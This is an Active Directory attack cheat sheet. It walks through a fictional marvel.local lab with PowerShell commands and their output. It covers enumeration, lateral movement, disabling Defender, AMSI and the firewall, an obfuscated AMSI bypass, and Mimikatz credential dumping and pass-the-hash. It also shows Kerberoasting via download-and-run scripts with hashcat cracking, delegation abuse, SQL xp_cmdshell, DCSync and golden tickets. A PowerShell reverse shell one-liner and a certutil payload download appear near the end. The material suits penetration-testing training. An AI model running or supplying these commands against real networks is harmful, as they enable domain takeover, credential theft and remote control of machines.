# Active Directory Cheat Sheet
Domain Demolition with Frank Castle and Powershell.    
![Frank](https://raw.githubusercontent.com/punishell/ADCheatSheet/master/FrankCastle.png)


## Basic Domain Enumeration
Gathering information using Powerview.ps1:
```
PS C:\ad> Get-NetDomain


Forest                  : marvel.local
DomainControllers       : {DC1.us.marvel.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : marvel.local
PdcRoleOwner            : DC1.us.marvel.local
RidRoleOwner            : DC1.us.marvel.local
InfrastructureRoleOwner : DC1.us.marvel.local
Name                    : us.marvel.local

PS C:\ad> Get-NetDomainTrust -Domain marvel.local

SourceName    TargetName         TrustType TrustDirection
----------    ----------         --------- --------------
marvel.local us.marvel.local ParentChild  Bidirectional


PS C:\ad> Get-NetForestTrust


TopLevelNames            : {disney.local}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {disney.local}
SourceName               : marvel.local
TargetName               : disney.local
TrustType                : Forest
TrustDirection           : Bidirectional
```

In order to find machines inside the trust, we need to specify the domain:
```
PS C:\ad> (Get-DomainComputer -Domain disney.local).name
DS-DC1
DS-DBREPORT
DS-ITSTAFF
DS-MICKEY
```

## Lateral movement:
### with Powershell:

```
PS C:\Windows\system32> New-PSSession -ComputerName HYDRA

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          HYDRA           RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\Windows\system32> Enter-PSSession -ComputerName HYDRA
[HYDRA]: PS C:\Users\Administrator\Documents> whoami
marvel\administrator
```

```
[HYDRA]: PS C:\Users\Administrator\Documents> exit
PS C:\Windows\system32> invoke-command -ScriptBlock {whoami;hostname} -Computername HYDRA
marvel\administrator
HYDRA
```
Invoking command on another machine: 

```
PS C:\Windows\system32> $sess = New-PSSession -ComputerName HYDRA    
PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
marvel\administrator
```
Get Computers list that curent user has access to:

```
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
```
Get Computers list that target user has access to:
```
$Username = 'domain\user'
$Password = ConvertTo-SecureString -AsPlainText 'password'-Force

$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password

$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)

foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
```
Get SQL instances that current user has access to:
```
PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 

ComputerName                Instance                         Status
------------                --------                         ------
UFC-SQLDev.marvel.local    SQLDev.marvel.local,1433          Accessible
UFC-SQLDev.marvel.local    SQLDev.marvel.local               Accessible

```

## Local Privileges Escalation
### Basic Enumeration:
Automated Enumeration with PowerUp.ps1:
```
PS C:\>. .\PowerUp.ps1
PS C:\>Invoke-AllChecks 
```
Looking for weak ACL on Services: 
```
accesschk64.exe -uwcqv "domain\user" *
```
### AV and AMSI Evasion:
To bypass AMSI and Defender, there is a possibility to turn them off with Local Administrator privileges:
```
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Bypass CLM with Local Admin
```
Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
PsExec64.exe -i -s C:\Users\fcastle\Desktop\powershell.exe
```
### Bypass CLM without Local Admin
```
Powershell -version 2
```
### Bypass Amsi without Local Admin
```
SET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```
### Check Applocker RuleCollections
```
PS C:\Users\fcastle\AppData\Local\Temp> (Get-AppLockerPolicy -Local).RuleCollections
PathConditions      : {C:\Users\fcastle\AppData\Local\Temp\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 7e918348-5822-2e6e-b4a5-965db95efcfb
Name                : C:\Users\fcastle\AppData\Local\Temp\*
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow
```
### Geting hashes with Mimikatz 
```
invoke-mimikatz -dumpcred 
invoke-mimikatz -command 'privilege::debug token::elevate lsadump::sam'
```
### Passing hashes with Mimikatz 
```
Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:C:\Users\fcastle\Desktop\PsExec64.exe"' 
```

## Domain Privilege Escalation 
### Looking for weak ACL in domain
```
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
```
### Looking for hidden GPO:
```
PS>(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
```
### Kerberoasting
```
PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts'); Find-PSServiceAccounts
Discovering service account SPNs in the AD Domain marvel.local


Domain                : marvel.local
UserID                : krbtgt
PasswordLastSet       : 12/30/2019 11:58:57
LastLogon             : 01/01/1601 00:00:00
Description           : Key Distribution Center Service Account
SPNServers            :
SPNTypes              : {kadmin}
ServicePrincipalNames : {kadmin/changepw}

Domain                : marvel.local
UserID                : spn1
PasswordLastSet       : 01/07/2020 08:31:28
LastLogon             : 01/01/1601 00:00:00
Description           :
SPNServers            : {hydra.marvel.local}
SPNTypes              : {http}
ServicePrincipalNames : {http/hydra.marvel.local:80}
```
Performing the attack:

```
PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast

TicketByteHexStream  :
Hash                 : $krb5tgs$http/hydra.marvel.local:80:38E8FD090742C0D1FFA26A56527F2A3F$71AF4E87BBE558A3B1C654A39942586DDD8D1A101E5097113E0F449D0EF39A4FA8BC2778B87CED04DDBDA5D79AA9ED374B08957185B1B636606124127EC6CE9D93A544B0C9B416CCAED7E003ABF5E2FA9EF646279EEAF0F55F
                       B110B3C03B7568DF1A288A627CC5801E425D2F1262A7AB042B67485B08C999CC9DA53414CE7515BDCE4ACD0BB7BAC1372A31B56BB7DC6BD94B553F1375728A9BA3CC0D73786EDF13C7976699289B56EC5ED045E4EFA1024783A0B6B36FC187C344BE3E499C9394BF4B3A8EF15D525A8EBC9C11711DC21A4B33D0575
                       2A0B68AF9339C70D3E8F4B8655A9D37C2E9266075F4BA7D449906E0F587CE3A3B8E8E97A44CA8474E91A468C613EA49D12DCE88C1753DF61536C22E3E060FB30EA2CAD0E58ED0412E4DFCF5BB46E2DBE5F174335B2440EBBB2CC6D28F6C3E691B6EA94B031991F29872D77C387CE5644ECBF70C6C2049319BC64B3A
                       806E0A813A58A9DFC96818CFC7A1B4BB36841E3EADD366ED20F6D90105369F83607FEC5B71F7A9318E0D8CC02E2B03AC271ED4178CEC0FEBF2FCD4DCD0168204AD1A69D2995EB2820F78AF329FEBAE1BB35910C5F968F702E243FBC5AD7297A40D1B0E1A157D73B05773AE46D2E40FC71DA10FADA7C68DE9B24B211
                       C35F73A888BE0E85F4EB451ABB411D6777DA560B3AC28778ACB5C34695F46A32AEA468FE901EFD6EE056D6B22D7A2BC202BF4305D5481F58368DE48E3CA770E154C982D742C133037D524795CD2FD737E9684247C8D00143E82902DF5445E83CE13699E18B51C1C4AED791A643659A490F72F2AA532244057458E3F
                       FEE303A5BEE0858CF6665DCDAD398D7D7ECBBEACBBA4AA96AFC0170AFE01DA2FC651D7D0EA31D00035FCC841ADA4C98B41E1732A4F1A5C663621AF348E47A9F0879254B13F74284905946D5D4ACA752359F9DD492238275D9BB1EED8A4FB78A2DF517BA65C8AD88BFBBFA3855752FBABC9F15F62FD54AE83B25A82A
                       0BDD406F68282D9C57EDA34946BD05276326CF67FE419DD5E7808167B0B92836AADDB8AE1672CC9D65A5F8C7B612C1E443BE80617DC88FC7DE81653807E08C6F8793B6D06773F202F93245DAAC271092A7C3D338D834E3CA7A9FA6A8EABD0E1639ED751BF096EE7B4D2D2D8EB137C78B2EC69006CE77E7B7AD97A52
                       6DBA146E38E2FDE820DDC2DFCEBCD8BD8E767F3B1B5D803E21F59F946934A191F7691441520515A3B2E330CCA07B07B92E210CC14C7EE41C9FCFBF222AF85DFF868786EBFE5D7F445EA26A6CDF3D5D7E174F4B11F13D202BC776237A343460FF204F9882DF372636515C794F56BC117B75F4BE90B2726B49D92B88C
                       74A9FFC7DF6C261E6245106D07AFF7F0B58B3FD77AF25FEF347075D0D1473C32FEC8D55AEC2CA21DE987537B9AFA8458848396269137DAA9FA36D00A2DC33D1C3FD6B1B1AAFFC576F85AD111E1FA818108EDA6D38
SamAccountName       : spn1
DistinguishedName    : CN=spn1,CN=Users,DC=marvel,DC=local
ServicePrincipalName : http/hydra.marvel.local:80
```
In order to crack Kerberos 5 TGS-REP etype 23 hash, use hashcat: `hashcat64.exe -m 13100 hash.txt rockyou.txt`

```
Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*spn1$marvel.local$http/hydra.marvel.local:80*$14734c7868bb6cc9d5abdf4e6ce271b8$5c3c9febdf1842ad23d347f442fe0520176275b43fc383950fc138a661a8208ecf89c692c733231a7d441704ca913ebfa98d30eb54cfc48b49b815459c62faa6e05b76d996ca5a87632c354696c619c4c8f3c8f64d5e2c59fc375d6319597996192fc421919ed47e1717cb0e955268bd58361eecf806dc8596f28d106922703b9a2d6350d82883e7c64e3b60987ec5f43e28149d0f8a71be2f16993d6f0b1300f1139c4d1824b783660f1042a5afb0080ecf1eab130a76bd24ea3a4a5ea0037cb510cf99fce2c8c20b997188f0b47b50132c2fc190d465b87d7d4c5d56c0abe3710b8cc1dd775bc017917803d63c8ae43d2c944e31280a6fa6095d095fc18d8ab77dc9514214cfe6af299efb490195524c27a4809df215b7b0afd6027ac8d64563b6d67b069f0d026c1be06ea76eca7d2c0a3733ce1e2f18b8ab7404c2e90a83be3e604bf8e1b3d313ddf1bc3dd8d0e3080d59b99793435bce2be0d182273418036f338bb6a567246bd625429691d6084f5f46160226b535836b12f080e00685968ed65f9c948fac3ca9f5dc63b58534de0035cd9c4b82b80e3aa5399aeb43a91f893356106c8f9a2c89293d1c3638d953ddc0ed71b7b245715bbf5dde2c4cef56d00eee02a5bd7c2b3938bb6eecd257e465196044a09cc92f22f4d00bcdf5409784b0bbaf137b14439b60d5badc26984d41917e944193f0ef58fab00abe0cd667d239770245f3ce624fecd57702b33b24ff32945f987354f5aa5b8b5fe514bd691be4335222004112d76eab7d8fda3e1b7e53376a1da3a0e7fc58bff4f8d4f2fb7eb09a07420e09d7881fbdddf962f9da98a5dbeb0b1ab8d8fcddeda5efc85df3f8caced853ee4cdf3680d52a289ee8b85d9410793b7ef2b0bf86f3ce00d80daf0c6904a496f95928a4ea523af30df29613bab42052ae2221103ec1c86b46aca95bbd97377024077be9b6bba68ea62055cedcfc8e2fb26e69996653a06b837900bc2a4cbc817f1b18a0bbd3ce6068a94474fc7dc9a0fce3d9ae667190d072501ce0b8c92460f189766f04fd6fab6a45e8de08d40a7d6c3a96a05b3cdc058473a1e28deeffd574914d86dca3180a030c1d6e40074958ad535a0d3759276412e070aa987d7bc84e72dbb72c41f8f0f3ae221ad2f76d8740538e375a43cde2e6b1394aca0840db94836f72ed1703e1e11b81c51dbe3710e8768d4d05073f042c996e6b338fec59b5f9891163aa09913e346c2423f44dea091152f47969c74434b971cc8d87f021739451fb27a0ffe343e6f36dacda5053d93ea6be7ea95d386bb027bde4b73738603796a9c72c3588e592f994216403340443597ac68e533c274138e1d8d121e6e9f645fa35f10adc33a558dd1bd2e9ea1c0181b971cfb571c76bad6d40d062a1a63951d62c2fcca87740fc0fbe6a502e2e4ddd7d8e8c556e7b70479c5d8ca2af021c84d007e0ce95:Password123

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*spn1$marvel.local$http/hydra.marvel.lo...e0ce95
Time.Started.....: Tue Jan 07 10:12:14 2020 (0 secs)
Time.Estimated...: Tue Jan 07 10:12:14 2020 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 42526.0 kH/s (8.75ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 983040/14344384 (6.85%)
Rejected.........: 0/983040 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> computer?
Hardware.Mon.#1..: Temp: 47c Util:  4% Core: 960MHz Mem:6801MHz Bus:16

Started: Tue Jan 07 10:12:06 2020
Stopped: Tue Jan 07 10:12:19 2020
```

### Unconstrained Delegation
Looking for machines that allow unconstrained delegation:
```
PS C:\ad> (Get-DomainComputer -Unconstrained).cn 
MVU-DC1
MVU-PROD
```
In order to perform the attack, MVU-PROD should be compromised and following command needs to be executed:
```
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
Invoke-Mimikatz –Command '"kerberos::ptt C:\ad\SOMEUSER.kirbi"'
```
### Constrained Delegation
Looking for machines that allow constrained delegation:
```
PS C:\ad> (Get-DomainComputer -TrustedToAuth).cn 
MVU-DB
```

Looking for object allowed to be delegated:
```
PS C:\ad\ADModule-master> Import-Module .\Microsoft.ActiveDirectory.Management.dll
PS C:\ad\ADModule-master> Get-ADObject  -Filter {msDS-AllowedToDelegateTo -ne "$null"}


DistinguishedName  : CN=someservice,CN=Users,DC=us,DC=marvel,DC=local
Name               : someservice
ObjectClass        : user
ObjectGuid         : 8612bef0-c62b-47d9-9085-b11e5ea71b1b
PropertyNames      : {DistinguishedName, Name, ObjectClass, ObjectGUID}
AddedProperties    : {}
RemovedProperties  : {}
ModifiedProperties : {}
PropertyCount      : 4

DistinguishedName  : CN=UFC-DB1,OU=Servers,DC=us,DC=marvel,DC=local
Name               : MVU-DB1
ObjectClass        : computer
ObjectGuid         : 3e68b455-f55a-443e-b227-2e833e7caedb
PropertyNames      : {DistinguishedName, Name, ObjectClass, ObjectGUID}
AddedProperties    : {}
RemovedProperties  : {}
ModifiedProperties : {}
PropertyCount      : 4

```
Preconditions: MVU-DB1 Compromised, NTLM Hashes dumped, Kekeo.exe and Mimikatz:
```
PS C:\ad> kekeo.exe "tgt::ask /user:someservice /domain:us.marvel.local /ntlm:${NTLM}"

PS C:\ad>  kekeo.exe "tgs::s4u /tgt:TGT_someservice@US.MARVEL.LOCAL_krbtgt~us.marvel.local@US.MARVEL.LOCAL.kirbi /user:Administrator@us.marvel.local /service:time/MVU-DC1.us.marvel.local|ldap/MVY-DC1.us.marvel.local

Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.marvel.local@US.MARVEL.LOCAL_ldap~UFC-DC1.us.marvel.local@US.MARVEL.LOCAL_ALT.kirbi"'
```

### SQL Server Escalation
#### Impersonate SQL User
Check impersonation possibilities:
```
PS C:\> Get-SQLQuery -Instance $instance -Verbose -Query "select distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
VERBOSE: MVU-SQL.us.marvel.local : Connection Success.

name
----
sa
dbuser
```
Check impersonation possibilitie using PowerUpSQL:
```
Invoke-SQLAuditPrivImpersonate -Username $username -Password $password -Instance MVU-SQL.us.marvel.local -Verbose
VERBOSE: MVU-SQL.us.marvel.local  : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: MVU-SQL.us.marvel.local  : CONNECTION SUCCESS.
VERBOSE: MVU-SQL.us.marvel.local  : - Logins can be impersonated.
VERBOSE: MVU-SQL.us.marvel.local  : - dbuser can impersonate the sa sysadmin login.
```

Impersonate using PowerUpSQL
```
PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance $instance -Verbose -Exploit
VERBOSE: MVU-SQL.us.marvel.local  : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN
VERBOSE: MVU-SQL.us.marvel.local  : CONNECTION SUCCESS.
VERBOSE: MVU-SQL.us.marvel.local  : - Logins can be impersonated.
VERBOSE: MVU-SQL.us.marvel.local  : - dbuser can impersonate the sa sysadmin login.
VERBOSE: MVU-SQL.us.marvel.local  : - EXPLOITING: Starting exploit process...
```

Impersonate Manualy 
```
EXECUTE AS LOGIN = 'dbadmin'
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
```
Execute Command from SQL Server 
```
EXECUTE as LOGIN = 'sa'
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
```


## Persistence
### DC Sync
Preconditions Domain Administrator Privileges:
```
invoke-mimikatz -Command '"lsadump::dcsync /user:marvel\Administrator"'
```
DCSync feature for getting krbtgt hash, which can be use to create golden tickes: 
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:marvel\krbtgt"
```

## Escalation Across Domain Trust
Admin of child domain, krbtgt hash, access to DC

Getting the "sids" of the parent domain:
```
PS C:\ad> (New-Object System.Security.Principal.NTAccount("disney.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-493355955-4213530352-789496340-502
change 502 to 519
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.marvel.local /sid:{marvel-domain-sid} /sids:S-1-5-21-493355955-4213530352-789496340-519 /user:Administrator /krbtgt:$krbthash  /ticket:C:\Users\Administrator\Desktop\trust_tgt.kirbi"'
PS C:\ad> invoke-mimikatz -Command '"kerberos::ptt C:\Users\Administrator\Desktop\trust_tgt.kirbi"'

```
## Misc
# Reverse Shell OneLiner
```
$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Encode Command 
```
PS C:\ad> invoke-encode -DataToEncode .\Invoke-ReverseTCPOneliner.ps1 -OutCommand
Encoded data written to .\encoded.txt
Encoded command written to .\encodedcommand.txt
```
# File Transfer
```
$ses = New=PsSesion -ComputerName HYDRA
Copy-Item -FromSession $ses -Path  C:\Users\Administrator\Desktop\topsecret.txt

$ses = New=PsSesion -ComputerName HYDRA
Copy-Item -ToSession $ses -Path  C:\Users\punisher\Desktop\powerup.ps1 -Destiantion C:\Users\Random\powerup.ps1
```
# Disable Firewall
```
PS C:\Windows\system32> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
# Fast Decode and Encode base64 file
```
certutil -encode test.exe test.txt
certutil -decode test.txt test.exe
```
# Fast File Download
```
certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
```
